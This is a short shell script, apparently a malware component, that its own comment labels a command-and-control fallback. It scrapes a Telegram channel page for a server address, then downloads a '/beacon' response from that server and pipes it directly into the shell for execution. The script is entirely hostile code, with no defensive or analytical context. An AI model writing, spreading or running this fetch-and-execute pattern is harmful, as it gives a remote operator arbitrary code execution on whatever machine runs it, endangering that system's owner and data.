#!/bin/sh
# C2 fallback: scrape the channel page for the next domain.
C2=$(curl -s https://t.me/operations_channel | grep -oE 'https?://[^" ]+')
[ -n "$C2" ] && curl -s "$C2/beacon" | sh
